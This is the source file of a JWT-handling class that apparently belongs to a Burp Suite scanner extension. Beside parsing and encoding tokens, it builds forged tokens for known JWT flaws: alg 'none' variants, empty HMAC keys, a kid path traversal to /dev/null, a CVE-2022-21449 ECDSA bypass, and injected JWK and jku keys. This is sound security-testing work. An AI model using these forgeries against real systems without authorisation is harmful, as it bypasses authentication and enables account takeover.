package ch.csnc.burp.jwtscanner;

import javax.crypto.Mac;
import javax.crypto.SecretKey;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.security.PrivateKey;
import java.security.Signature;
import java.security.interfaces.RSAPublicKey;
import java.util.*;
import java.util.regex.Pattern;

import static ch.csnc.burp.jwtscanner.Base64.*;
import static ch.csnc.burp.jwtscanner.Gson.gson;

/**
 * This class is designed to be immutable, meaning that its internal state should not be altered by any method calls.
 * Instead, new {@link Jwt} instances should be returned.
 * <p>
 * This class uses {@link LinkedHashMap} as the underlying data structure when decoding and encoding JSON strings.
 * This preserves the order of key insertion, which is important for producing JSON strings with a consistent key order.
 * While this may not be critical for JSON itself, it is essential for JWT, as an inconsistent key order can lead to
 * signature mismatches.
 */
public class Jwt {

    @FunctionalInterface
    interface TriConsumer<A, B, C> {
        void accept(A a, B b, C c);
    }

    public static final Pattern PATTERN = Pattern.compile("(ey[a-zA-Z0-9_=]+)\\.(ey[a-zA-Z0-9_=\\-]+)\\.([a-zA-Z0-9_\\-+/=]*)");

    private LinkedHashMap<String, Object> header;
    private LinkedHashMap<String, Object> payload;
    private String signature;

    @SuppressWarnings("unchecked")
    private static void decode(String encodedJwt, TriConsumer<LinkedHashMap<String, Object>, LinkedHashMap<String, Object>, String> consumer) {
        var parts = encodedJwt.split("\\.", -1);
        if (parts.length != 3) {
            throw new IllegalArgumentException("parse error: %s".formatted(encodedJwt));
        }
        var headerBytes = base64UrlDecoder.decode(parts[0]);
        var payloadBytes = base64UrlDecoder.decode(parts[1]);
        var headerString = new String(headerBytes, StandardCharsets.UTF_8);
        var payloadString = new String(payloadBytes, StandardCharsets.UTF_8);
        var header = gson.fromJson(headerString, LinkedHashMap.class);
        var payload = gson.fromJson(payloadString, LinkedHashMap.class);
        var signature = parts[2];
        consumer.accept(header, payload, signature);
    }


    private static String encode(LinkedHashMap<String, Object> header, LinkedHashMap<String, Object> payload) {
        var headerJson = gson.toJson(header);
        var headerBase64 = base64UrlEncoderNoPadding.encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
        var payloadJson = gson.toJson(payload);
        var payloadBase64 = base64UrlEncoderNoPadding.encodeToString(payloadJson.getBytes(StandardCharsets.UTF_8));
        return "%s.%s".formatted(headerBase64, payloadBase64);
    }

    private static String encode(LinkedHashMap<String, Object> header, LinkedHashMap<String, Object> payload, String signature) {
        return "%s.%s".formatted(encode(header, payload), signature);
    }

    public Jwt(String encodedJwt) {
        decode(encodedJwt, (header, payload, signature) -> {
            this.header = header;
            this.payload = payload;
            this.signature = signature;
        });
    }

    public String encode() {
        return encode(this.header, this.payload, this.signature);
    }

    public boolean hasExpiry() {
        return this.payload.containsKey("exp");
    }

    public boolean isExpired() {
        if (this.hasExpiry()) {
            var exp = (BigDecimal) this.payload.get("exp");
            var now = System.currentTimeMillis() / 1000;
            return exp.longValue() < now;
        }
        return false;
    }

    public Optional<String> getAlg() {
        var obj = this.header.get("alg");
        if (obj == null) {
            return Optional.empty();
        }
        if (obj instanceof String s) {
            return Optional.of(s);
        }
        return Optional.empty();
    }

    public boolean hasSymmetricAlg() {
        return this.getAlg().map(alg -> switch (alg) {
            case "HS256", "HS384", "HS512" -> true;
            default -> false;
        }).orElse(false);
    }

    public boolean hasAsymmetricAlg() {
        return this.getAlg().map(alg -> switch (alg) {
            case "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512" -> true;
            default -> false;
        }).orElse(false);
    }

    public Optional<String> getJku() {
        return this.getHeaderAsString("jku");
    }

    public Optional<String> getKid() {
        return this.getHeaderAsString("kid");
    }

    public Optional<Jwk> getJwk() {
        var jwk = this.header.get("jwk");
        if (jwk == null) {
            return Optional.empty();
        }
        try {
            // looking silly?
            var json = gson.toJson(jwk);
            return Optional.of(gson.fromJson(json, Jwk.class));
        } catch (Exception exc) {
            JwtScannerExtension.apiAdapter().logging().logToError(exc);
            return Optional.empty();
        }
    }

    private Optional<String> getHeaderAsString(String key) {
        var value = this.header.get(key);
        if (value == null) {
            return Optional.empty();
        }
        if (value instanceof String s) {
            return Optional.of(s);
        }
        return Optional.empty();
    }

    public Jwt withRemovedSignature() {
        return Jwt.newBuilder(this).withSignature("").build();
    }

    public Jwt withWrongSignature() {
        var chars = Arrays.asList(this.signature.split(""));
        Collections.shuffle(chars);
        var signature = String.join("", chars);
        return Jwt.newBuilder(this).withSignature(signature).build();
    }

    public List<Jwt> withAlgNone() {
        var input = "none";
        var permutations = new ArrayList<String>();
        int n = input.length();
        int totalPermutations = 1 << n; // 2^n permutations
        for (int i = 0; i < totalPermutations; i++) {
            char[] perm = input.toCharArray();
            for (int j = 0; j < n; j++) {
                if ((i & (1 << j)) != 0) {
                    perm[j] = Character.toUpperCase(perm[j]);
                }
            }
            permutations.add(new String(perm));
        }
        return permutations.stream().map(alg -> Jwt.newBuilder(this).withHeader("alg", alg).withSignature("").build()).toList();
    }

    public Jwt withEmptyPassword() {
        return Jwt.newBuilder(this).withHeader("alg", "HS256").withHS256Signature("").build();
    }

    public Jwt withKidPointingToDevNull() {
        return Jwt.newBuilder(this)
                .withHeader("kid", "../../../../../../../../../../../dev/null")
                .build()
                .withEmptyPassword();
    }

    public Jwt withInvalidEcdsa() {
        // CVE-2022-21449
        return Jwt.newBuilder(this).withHeader("alg", "ES256").withSignature("MAYCAQACAQA").build();
    }

    public Jwt withInjectedJwkSelfSigned() {
        var keyPair = Rsa.getOrGenerateKeyPair();
        var publicKey = (RSAPublicKey) keyPair.getPublic();
        var kid = UUID.randomUUID().toString();
        var jwk = new Jwk(kid, publicKey);
        return Jwt.newBuilder(this)
                .withHeader("alg", "RS256")
                .withHeader("kid", kid)
                .withHeader("jwk", jwk)
                .withRS256Signature(keyPair.getPrivate())
                .build();
    }

    public Jwt withInjectedJkuSelfSigned() {
        var keyPair = Rsa.getOrGenerateKeyPair();
        var publicKey = (RSAPublicKey) keyPair.getPublic();
        var kid = UUID.randomUUID().toString();
        var jwk = new Jwk(kid, publicKey);
        var jwks = new LinkedHashMap<String, Object>();
        jwks.put("keys", List.of(jwk));
        var jwksJson = gson.toJson(jwks);
        var jwksBase64 = base64UrlEncoderWithPadding.encodeToString(jwksJson.getBytes(StandardCharsets.UTF_8));
        var jku = "https://httpbin.org/base64/%s".formatted(jwksBase64);
        return Jwt.newBuilder(this)
                .withHeader("alg", "RS256")
                .withHeader("kid", kid)
                .withHeader("jku", jku)
                .withRS256Signature(keyPair.getPrivate())
                .build();
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;
        Jwt jwt = (Jwt) o;
        return Objects.equals(header, jwt.header) && Objects.equals(payload, jwt.payload) && Objects.equals(signature, jwt.signature);
    }

    @Override
    public int hashCode() {
        return Objects.hash(header, payload, signature);
    }

    @Override
    public String toString() {
        return this.encode();
    }

    public static Builder newBuilder() {
        return new Builder();
    }

    public static Builder newBuilder(String encodedJwt) {
        return new Builder(encodedJwt);
    }

    public static Builder newBuilder(Jwt jwt) {
        return new Builder(jwt);
    }

    public static class Builder {

        private LinkedHashMap<String, Object> header;
        private LinkedHashMap<String, Object> payload;
        private String signature;

        private Builder() {
            this.header = new LinkedHashMap<>();
            this.payload = new LinkedHashMap<>();
            this.signature = "";
        }

        private Builder(String encodedJwt) {
            decode(encodedJwt, (header, payload, signature) -> {
                this.header = header;
                this.payload = payload;
                this.signature = signature;
            });
        }

        private Builder(Jwt jwt) {
            this(jwt.encode());
        }

        public Builder withHeader(String key, Object value) {
            this.header.put(key, value);
            return this;
        }

        public Builder withClaim(String key, Object value) {
            this.payload.put(key, value);
            return this;
        }

        public Builder withSignature(String signature) {
            this.signature = signature;
            return this;
        }

        public Builder withHS256Signature(String secret) {
            try {
                var headerPayload = encode(this.header, this.payload);
                var secretKeySpec = new SecretKey() {
                    @Override
                    public String getAlgorithm() {
                        return "HmacSHA256";
                    }

                    @Override
                    public String getFormat() {
                        return "RAW";
                    }

                    @Override
                    public byte[] getEncoded() {
                        return secret.getBytes(StandardCharsets.UTF_8);
                    }
                };
                var mac = Mac.getInstance("HmacSHA256");
                mac.init(secretKeySpec);
                mac.update(headerPayload.getBytes(StandardCharsets.UTF_8));
                var signatureBytes = mac.doFinal();
                this.signature = base64UrlEncoderNoPadding.encodeToString(signatureBytes);
                return this;
            } catch (Exception exc) {
                JwtScannerExtension.apiAdapter().logging().logToError(exc);
                throw new RuntimeException(exc);
            }
        }

        public Builder withRS256Signature(PrivateKey privateKey) {
            try {
                var headerPayload = encode(this.header, this.payload);
                var signer = Signature.getInstance("SHA256withRSA");
                signer.initSign(privateKey);
                signer.update(headerPayload.getBytes(StandardCharsets.UTF_8));
                this.signature = base64UrlEncoderNoPadding.encodeToString(signer.sign());
                return this;
            } catch (Exception exc) {
                JwtScannerExtension.apiAdapter().logging().logToError(exc);
                throw new RuntimeException(exc);
            }
        }

        public Jwt build() {
            // It may seem inefficient to encode the header, payload, and signature, which are
            // decoded again in the Jwt constructor. However, this is done intentionally to ensure
            // that all data is copied and that no data structures are passed by reference,
            // which would make the Jwt class mutable. Note that Map.copyOf does not perform deep copies.
            return new Jwt(encode(this.header, this.payload, signature));
        }

    }
}
